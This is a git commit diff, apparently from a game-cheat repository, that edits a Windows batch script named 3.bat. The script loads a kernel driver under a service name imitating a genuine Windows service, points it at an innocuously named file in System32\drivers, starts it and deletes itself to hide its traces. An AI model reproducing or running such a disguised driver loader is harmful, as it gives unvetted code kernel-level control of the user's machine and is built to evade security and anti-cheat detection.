5a3920d9d6603fbca81186cf7a3d862f129120cc
842834fdjfgfg <109022461+TrinityCheat@users.noreply.github.com>
2025-10-19 02:27:26 +0700

    Update 3.bat

--- 3.bat
+++ 3.bat
@@ -1,7 +1,7 @@
 @echo off
 cd %~dp0
-sc create BcastDVRUserService36 binpath=C:\Windows\System32\drivers\filedecrypt.sys type=kernel
-sc start BcastDVRUserService36
+sc create BcastDVRUserService18 binpath=C:\Windows\System32\drivers\hidi3c.sys type=kernel
+sc start BcastDVRUserService18
 del "%~f0"
 
 
